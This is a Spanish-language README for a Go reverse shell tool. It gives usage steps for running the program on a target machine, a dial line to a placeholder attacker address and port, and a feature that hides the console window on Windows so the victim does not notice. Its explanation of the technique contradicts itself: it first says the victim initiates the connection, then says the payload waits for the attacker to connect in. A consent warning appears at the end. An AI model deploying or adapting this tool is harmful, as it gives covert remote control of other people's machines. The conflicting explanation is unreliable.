# Reverse Shell en Go

Este es un programa simple de reverse shell escrito en Go que establece una conexión TCP y ejecuta comandos en una máquina remota. 
Una Reverse Shell (o shell inversa) es una técnica utilizada en ciberseguridad y hacking que implica la conexión a una máquina remota y la ejecución de comandos desde esa máquina en la máquina local. En lugar de la típica comunicación directa desde el cliente al servidor, como en una shell normal, en una reverse shell, el cliente es el que inicia la conexión y el servidor la acepta.

El flujo típico de una reverse shell es el siguiente:

1.- Un atacante (o un programa malicioso) coloca un "payload" en la máquina de la víctima. Este payload podría ser un script, un ejecutable o cualquier tipo de código malicioso.

2.- El payload se ejecuta en la máquina de la víctima, y en lugar de establecer una conexión saliente hacia el atacante, espera a que el atacante inicie la conexión.

3.- El atacante utiliza su propia máquina como servidor y se conecta al payload que se está ejecutando en la máquina de la víctima.

4.- Una vez establecida la conexión, el atacante obtiene acceso a una shell en la máquina de la víctima, lo que le permite ejecutar comandos y controlar el sistema remoto.

La reverse shell es una técnica utilizada en situaciones donde los firewalls y otras medidas de seguridad bloquean las conexiones entrantes, pero permiten las conexiones salientes. Al invertir el flujo de comunicación, el atacante puede eludir algunas restricciones de seguridad.

# Características

- **Conexión TCP**: Establece una conexión TCP con la dirección IP y el puerto especificados.

- **Ejecución de Comandos Remotos**: Ejecuta comandos en la máquina remota a través de la conexión TCP.

- **Ocultar Ventana en Windows**: En sistemas operativos Windows, la ventana de la consola se oculta utilizando `syscall.SysProcAttr{HideWindow: true}`.

# Uso

1. Clona el repositorio:

    ```bash
    git clone https://github.com/tuusuario/reverse-shell-go.git
    cd reverse-shell-go
    ```

2. Edita el archivo `main.go` y ajusta la dirección IP y el puerto según tus necesidades.

    ```go
    c, _ := net.Dial("tcp", "TU_IP:TU_PUERTO")
    ```

3. Compila el código:

    ```bash
    go build main.go
    ```

4. Ejecuta el programa en la máquina de destino:

    ```bash
    ./main
    ```

5. En tu máquina local, utiliza un programa cliente para conectarte al servidor y ejecutar comandos.

# Advertencia

Este código permite la ejecución remota de comandos en una máquina y debe usarse con extrema precaución. No lo utilices en entornos no seguros o sin el consentimiento del propietario del sistema.

# Contribuciones

Las contribuciones son bienvenidas. Si encuentras algún problema o tienes sugerencias de mejora, por favor, crea un issue o envía un pull request.

